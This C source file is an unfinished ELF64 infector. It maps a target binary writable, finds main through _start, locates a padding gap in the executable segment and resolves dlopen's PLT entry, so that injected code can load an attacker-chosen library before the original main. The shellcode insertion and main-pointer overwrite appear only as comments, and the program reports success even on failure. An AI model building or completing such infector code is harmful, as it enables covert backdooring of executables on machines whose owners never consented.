// this will take a elf64 and insert in a new main to run before the real main
// the new main will load a library and call into it
// thanks to pico's awesome writeup on 0x00sec for some inspiration

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <string.h>

// elf header defs
#define ELF_HEAD_TYPE_OFFSET		0x04
#define ELF_HEAD_ENTRY_OFFSET		0x18
#define ELF_HEAD_SHOFF_OFFSET		0x28
#define ELF_HEAD_SHENTSIZE_OFFSET	0x3a
#define ELF_HEAD_SHNUM_OFFSET		0x3c
#define ELF_HEAD_PHOFF_OFFSET		0x20
#define ELF_HEAD_PHENTSIZE_OFFSET	0x36
#define ELF_HEAD_PHNUM_OFFSET		0x38
#define ELF_HEAD_SIZE			0x40
#define ELF_HEAD_STRSECIND		0x3E
#define ELF_SECTION_VADDR		0x10
#define ELF_SECTION_FILEOFF		0x18
#define ELF_SECTION_SIZE		0x20
#define ELF_SECTION_SHNAME		0x00
#define ELF_SECTION_TYPE		0x04
#define ELF_SECTION_ATTRIBUTES		0x08
#define ELF_SECTION_LINK		0x28
#define ELF_SECTION_INFO		0x2C
#define ELF_SECTION_ENTSIZE		0x38
#define ELF_PHEAD_TYPE			0x00
#define ELF_PHEAD_PFLAGS		0x04
#define ELF_PHEAD_FILEOFF		0x08
#define ELF_PHEAD_VADDR			0x10
#define ELF_PHEAD_FILESZ		0x20
#define ELF_PT_LOAD			0x01
#define ELF_EXEC_FLAGS			0x11
#define ELF_STRTAB_SIZE			24
#define ELF_RELENT_SIZE			24
#define ELF_RELENT_SYM			12

#define START_REXMOV_CODE		((char[]){0x48, 0xc7, 0xc7})
#define START_REXMOV_LEN		3 
#define START_REXMOV_ADDRLEN		4

#define START_REXLEA_CODE		((char[]){0x48, 0x8d, 0x3d})
#define START_REXLEA_LEN		3
#define START_REXLEA_ADDRLEN		4

// macros
#define ELF64_R_TYPE_DATA(info)       (((Elf64_Xword)(info)<<32)>>40)
#define ELF64_R_TYPE_ID(info)         (((Elf64_Xword)(info)<<56)>>56)
#define ELF64_R_TYPE_INFO(data, type) (((Elf64_Xword)(data)<<8) + (Elf64_Xword)(type))
// helpful types

typedef struct main_arg_t {
	uint8_t* file_ptr;
	size_t addr_size;
	uint8_t* rip; // if rip is not null, then it is an absolute address at the file_ptr
	uint8_t* main_addr;
} main_arg_t;

typedef struct empty_area_t {
	uint64_t fileoffset;
	uint64_t vaddr;
	uint64_t size;
} empty_area_t;

typedef struct plt_entry_t {
	uint64_t vaddr;
} plt_entry_t;

// static helper functions
static void print_usage();
static int open_and_map(char* fname, uint8_t** data, size_t* len);
static int find_arg_main(uint8_t* elf, main_arg_t* res);
static int find_gap(uint8_t* elf_base, empty_area_t* area);
static int find_plt(uint8_t* elf_base, char* fun_name, plt_entry_t* plt);

void print_usage(char* progname) {
	printf("Usage : %s /path/to/elf /path/to/lib exported_func\n", progname);
}

int open_and_map(char* fname, uint8_t** data, size_t* len) {
	struct stat st;
	size_t size;
	int fd;
	
	// open the target bin
	// needs read write permissions, so you may have to make a copy firs
	// in fact, you should probably make sure there is no concurrent access while we are editing the file
  	if ((fd = open(fname, O_APPEND | O_RDWR, 0)) < 0) {
		printf("err on open %s\n", fname);
		return -1;
	}

	// get file size
	if (fstat(fd, &st)) {
		printf("err on stat\n");
		return -1;
	}
	size = st.st_size;

	// map the file to appropriately
	if ((*data = (uint8_t*)mmap (NULL, size, (PROT_READ|PROT_WRITE|PROT_EXEC), MAP_SHARED, fd, 0)) == MAP_FAILED) {
		printf("err on mmap\n");
		return -1;
	}

	printf("File mapped (%zd bytes ) at %p\n", size, data);

	*len = size;
	return fd;
}

int find_arg_main(uint8_t* elf_base, main_arg_t* res) {
	uint8_t type;
	uint64_t startoff;
	uint64_t section_off;
	uint16_t section_entry_size;
	uint16_t section_entry_count;
	uint8_t* cursor;
	int i;
	uint64_t section_vaddr;
	uint64_t section_size;
	uint64_t text_file_offset = 0;
	uint32_t main_addr;
	
	// first find the _start
	// 1 == 32, 2 == 64
	type = elf_base[ELF_HEAD_TYPE_OFFSET];

	if (type == 1) {
		printf("32 bit elf files unsupported\n");
		return -1;
	}

	// get the entry pointer (which is an offset to us)
	startoff = *((uint64_t*)(elf_base + ELF_HEAD_ENTRY_OFFSET));

	printf("Found _start at %p\n", (void*)startoff);

	// parse the section entries for .text
	section_off = (*(uint64_t*)(elf_base + ELF_HEAD_SHOFF_OFFSET));
	section_entry_size = *((uint16_t*)(elf_base + ELF_HEAD_SHENTSIZE_OFFSET));
	section_entry_count = *((uint16_t*)(elf_base + ELF_HEAD_SHNUM_OFFSET));

	cursor = elf_base + section_off;

	// go through the symbol table
	// we don't want to go looking for section strings, because those can be stripped
	// so we will check for the section that contains our _start
	for (i = 0; i < section_entry_count; i++, cursor += section_entry_size) {
		section_vaddr = *((uint64_t*)(cursor + ELF_SECTION_VADDR));
		section_size = *((uint64_t*)(cursor + ELF_SECTION_SIZE));
		if (section_vaddr <= startoff && (section_vaddr + section_size) > startoff) {
			text_file_offset = *((uint64_t*)(cursor + ELF_SECTION_FILEOFF));
			break;
		}
	}

	if (!text_file_offset) {
		// we didin't find the section
		printf("Couldn't find section for _start!\n");
		return -1;
	}


	printf("section vaddr at %016lx, section file off %016lx\n", section_vaddr, text_file_offset);
	startoff = (startoff - section_vaddr) + text_file_offset;
	cursor = elf_base + startoff;
	
	printf("Start in the file should be at offset %p\n", (void*)startoff);

	// we have the section, now we need to find mov rdi, main before the call to __libc_start_main
	// so in most x86-64 elf files the mov is a REX.W mov, so the instruction starts with 3 bytes
	// or they use a REX.W lea
	// we really should use a length disassembler

	while (1) {
		if (!memcmp(cursor, START_REXMOV_CODE, START_REXMOV_LEN)) {
			// set it up as a MOV
			cursor += START_REXMOV_LEN;
			res->file_ptr = cursor;
			res->addr_size = START_REXMOV_ADDRLEN;
			res->rip = 0;
			main_addr = *((uint32_t*)(cursor));
			res->main_addr = ((uint8_t*)NULL) + main_addr;
			break;
		}
		if (!memcmp(cursor, START_REXLEA_CODE, START_REXLEA_LEN)) {
			// set it up as a LEA
			cursor += START_REXLEA_LEN;
			res->file_ptr = cursor;
			res->addr_size = START_REXLEA_ADDRLEN;
			// the next lines are correct, but confusing. need clarification
			res->rip = (uint8_t*)((uint8_t*)cursor + START_REXLEA_ADDRLEN + section_vaddr - elf_base - text_file_offset);
			res->main_addr = (uint8_t*)((res->rip) + *((int32_t*)cursor));
			break;
		}
		cursor++;
		if (cursor >= (elf_base + startoff + section_size)) {
			// we didn't find it :(
			return -1;
		}
	}
	

	return 0;
}

int find_gap(uint8_t* elf_base, empty_area_t* area) {
	// go through each program header entry
	// a section of type PT_LOAD that means it is loaded from the file	
	// We need to find the executable one
	// then we need to find a loaded section right next to the end of the executable tl_load, so we know our gap size in the file

	uint64_t phoff;
	uint16_t phentsize;
	uint16_t phnum;
	uint8_t* cursor;
	int i;
	uint32_t ptype;
	uint32_t pflags;
	uint64_t poff;
	uint64_t psz;
	uint64_t pvaddr;

	uint64_t text_end = 0;
	uint64_t pad_len = -1;

	phoff = *((uint64_t*)(elf_base + ELF_HEAD_PHOFF_OFFSET));
	phentsize = *((uint16_t*)(elf_base + ELF_HEAD_PHENTSIZE_OFFSET));
	phnum = *((uint16_t*)(elf_base + ELF_HEAD_PHNUM_OFFSET));

	printf("Number headers %d, size %d\n", phnum, phentsize);

	cursor = elf_base + phoff;
	for (i = 0; i < phnum; i++, cursor += phentsize) {
		ptype = *((uint32_t*)(cursor + ELF_PHEAD_TYPE)); 
		pflags = *((uint32_t*)(cursor + ELF_PHEAD_PFLAGS)); 
		poff = *((uint64_t*)(cursor + ELF_PHEAD_FILEOFF)); 
		psz = *((uint64_t*)(cursor + ELF_PHEAD_FILESZ)); 
		pvaddr = *((uint64_t*)(cursor + ELF_PHEAD_VADDR));
		
		printf("Type %x, flags %x, off %016lx, vaddr %016lx sz %016lx\n", ptype, pflags, poff, pvaddr, psz);

		if ((pflags & ELF_EXEC_FLAGS) && ptype == ELF_PT_LOAD) {
			// found our text segment
			text_end = poff + psz;
			area->vaddr = pvaddr + psz;
			break;
		}
	}
	
	// we didn't find a loaded executable seciton
	if (text_end == 0) {
		return -1;
	}

	cursor = elf_base + phoff;
	for (i = 0; i < phnum; i++, cursor += phentsize) {
		ptype = *((uint32_t*)(cursor + ELF_PHEAD_TYPE)); 
		pflags = *((uint32_t*)(cursor + ELF_PHEAD_PFLAGS)); 
		poff = *((uint64_t*)(cursor + ELF_PHEAD_FILEOFF)); 
		psz = *((uint64_t*)(cursor + ELF_PHEAD_FILESZ)); 
		
		printf("Type %x, flags %x, off %018lx, sz %018lx\n", ptype, pflags, poff, psz);

		if (poff < text_end || ptype != ELF_PT_LOAD) {
			continue;
		}

		if ((poff - text_end) < pad_len) {
			pad_len = poff - text_end;	
		}
	}

	printf("Padding size = %0lx\n", pad_len);

	area->fileoffset = text_end;
	area->size = pad_len;

	return 0;
}

int find_plt(uint8_t* elf_base, char* fun_name, plt_entry_t* plt) {
	uint64_t section_off;
	uint16_t section_entry_size;
	uint16_t section_entry_count;
	uint16_t string_sec_index;
	uint8_t* cursor;
	uint8_t* string_sec_base;
	uint32_t shname_off;
	uint32_t shinfo_i;
	uint32_t shlink_i;
	//uint64_t shvaddr;
	uint64_t shfile_off;
	uint64_t shsize;
	uint32_t shtype;
	uint64_t shflags;
	//uint64_t shentsize;
	int i;
	uint8_t* infoptr = NULL;
	uint64_t infosz = 0;
	uint8_t* linkptr = NULL;
	uint64_t linksz = 0;
	uint8_t* linklinkptr = NULL;
	uint64_t linklinksz = 0;
	uint8_t* relapltptr = NULL;
	uint64_t relapltsz = 0;

	// NOTES
	// Because we need dlopen and dlsym, we are just going to depend on the plt already having our things
	// so, we need to read the .rela.plt, and use the info section to find the index in the .dynsym
	// #define ELF32_R_SYM(val) ((val) >> 8)
	// #define ELF32_R_TYPE(val) ((val) & 0xff)

	// for now, just go through the section header

	section_off = *((uint64_t*)(elf_base + ELF_HEAD_SHOFF_OFFSET));
	section_entry_size = *((uint16_t*)(elf_base + ELF_HEAD_SHENTSIZE_OFFSET));
	section_entry_count = *((uint16_t*)(elf_base + ELF_HEAD_SHNUM_OFFSET));
	string_sec_index = *((uint16_t*)(elf_base + ELF_HEAD_STRSECIND));

	cursor = elf_base + section_off;

	// first go to the string section
	cursor += (string_sec_index * section_entry_size);
	shfile_off = *((uint64_t*)(cursor + ELF_SECTION_FILEOFF));
	string_sec_base = elf_base + shfile_off;
	
	cursor = elf_base + section_off;

	// go through the symbol table
	for (i = 0; i < section_entry_count; i++, cursor += section_entry_size) {
		shname_off = *((uint32_t*)(cursor + ELF_SECTION_SHNAME));
		//shvaddr = *((uint64_t*)(cursor + ELF_SECTION_VADDR));
		shsize = *((uint64_t*)(cursor + ELF_SECTION_SIZE));
		shfile_off = *((uint64_t*)(cursor + ELF_SECTION_FILEOFF));
		shtype = *((uint32_t*)(cursor + ELF_SECTION_TYPE));
		shflags = *((uint64_t*)(cursor + ELF_SECTION_ATTRIBUTES));
		//shentsize = *((uint64_t*)(cursor + ELF_SECTION_ENTSIZE));
		shinfo_i = *((uint32_t*)(cursor + ELF_SECTION_INFO));
		shlink_i = *((uint32_t*)(cursor + ELF_SECTION_LINK));
		
		printf("%d %s : %x %lx\n", i, string_sec_base + shname_off, shtype, shflags); 

		// if we find .plt, .rela.plt or .dynstr, keep track of it
		if (strstr((char*)string_sec_base + shname_off, ".rela.plt")) {
			printf("Found .rela.plt @ %lx\n", shfile_off);
			relapltptr = elf_base + shfile_off;
			relapltsz = shsize;
	
			// the plt section referenced is in sh_info
			cursor = (elf_base + section_off) + (shinfo_i * section_entry_size);
			shfile_off = *((uint64_t*)(cursor + ELF_SECTION_FILEOFF));
			shsize = *((uint64_t*)(cursor + ELF_SECTION_SIZE));
			shname_off = *((uint32_t*)(cursor + ELF_SECTION_SHNAME));
			infoptr = elf_base + shfile_off;	
			infosz = shsize;
			printf("info = %s %d\n", string_sec_base + shname_off, shinfo_i); 
			
			// the dynsym? is referenced in sh_link
			cursor = (elf_base + section_off) + (shlink_i * section_entry_size);
			shfile_off = *((uint64_t*)(cursor + ELF_SECTION_FILEOFF));
			shsize = *((uint64_t*)(cursor + ELF_SECTION_SIZE));
			shname_off = *((uint32_t*)(cursor + ELF_SECTION_SHNAME));
			linkptr = elf_base + shfile_off;	
			linksz = shsize;
			printf("link = %s %d\n", string_sec_base + shname_off, shlink_i); 

			shlink_i = *((uint32_t*)(cursor + ELF_SECTION_LINK));
			// the dynstr? is referenced in sh_link
			cursor = (elf_base + section_off) + (shlink_i * section_entry_size);
			shfile_off = *((uint64_t*)(cursor + ELF_SECTION_FILEOFF));
			shsize = *((uint64_t*)(cursor + ELF_SECTION_SIZE));
			shname_off = *((uint32_t*)(cursor + ELF_SECTION_SHNAME));
			linklinkptr = elf_base + shfile_off;	
			linklinksz = shsize;
			printf("linklink = %s %d\n", string_sec_base + shname_off, shlink_i); 
			
			break;
			//DEBUG
			//cursor = (elf_base + section_off) + (i * section_entry_size);
		}
	}

	// go through .rela.plt, finding the function's plt
	// DEBUG
	printf ("rela.plt @ %p %lx\n", (void*)(relapltptr - elf_base), relapltsz);
	printf ("info @ %p %lx\n", (void*)(infoptr - elf_base), infosz);
	printf ("link @ %p %lx\n", (void*)(linkptr - elf_base), linksz);
	printf ("linklink @ %p %lx\n", (void*)(linklinkptr - elf_base), linklinksz);
	// print out the rela.plt
	for (i=0; i<relapltsz; i += ELF_RELENT_SIZE) {
		uint32_t symoff = *(uint32_t*)(relapltptr + i + ELF_RELENT_SYM);
		char* sym = (char*)linklinkptr + *(uint32_t*)(linkptr + (symoff * ELF_STRTAB_SIZE));
		uint64_t vaddr = *(uint64_t*)(relapltptr+i);
		printf("plt for %s is at %016lx\n", sym, vaddr);
		if (strstr(sym, fun_name)) {
			// found it
			// this is the addr you want to jump to the value of
			// jmp [this_vaddr]
			plt->vaddr = vaddr;
			return 0;
		}
	}

	return -1;
}
	

int do_infect(char* target_path, char* lib_path, char* exported_func) {
	int tfd;
	uint8_t* tdata;
	size_t tdata_len;
	main_arg_t arg_main;
	empty_area_t pad_area;
	plt_entry_t dlopen_plt;
	

	// open and map target
	tfd = open_and_map(target_path, &tdata, &tdata_len);
	if (tfd == -1) {
		printf("Couldn't open and map\n");
		return -1;
	}

	// find original main
	// it will be an argument to __libc_start_main
	if (find_arg_main(tdata, &arg_main)) {
		printf("Couldn't find main as an arg\n");
		close(tfd);
		return -1;
	}
	
	printf("Found main at %016lx, with rip %016lx\n", (uint64_t)arg_main.main_addr, (uint64_t)arg_main.rip);

	// find area for our new main
	if (find_gap(tdata, &pad_area)) {
		printf("Couldn't find a gap\n");
		return -1;
	}
	printf("foff = %lx, vaddr = %lx, len = %lx\n", pad_area.fileoffset, pad_area.vaddr, pad_area.size);

	// get the needed symbols
	if (find_plt(tdata, "dlopen", &dlopen_plt)) {
		printf("Couldn't find dlopen!\n");
		return -1;
	}

	printf("Found dlopen at %lx\n", dlopen_plt.vaddr);

	// grab the shellcode

	// give the shellcode the needed addresses on the end, in the correct positions
	// #1 Original Main
	// #2 dynopen
	// #3 dynsym
	// #4 library path
	// #5 functin name

	// put in our new main

	// overwrite original main pointer

	// cleanup
	close(tfd);

	return 0;
}

int main(int argc, char** argv) {
	
	if (argc < 4) {
		print_usage(argv[0]);
		exit(-1);
	}

	if (do_infect(argv[1], argv[2], argv[3])) {
		printf("Failed\n");
	}
	printf("Success\n");
	
	return 0;

}
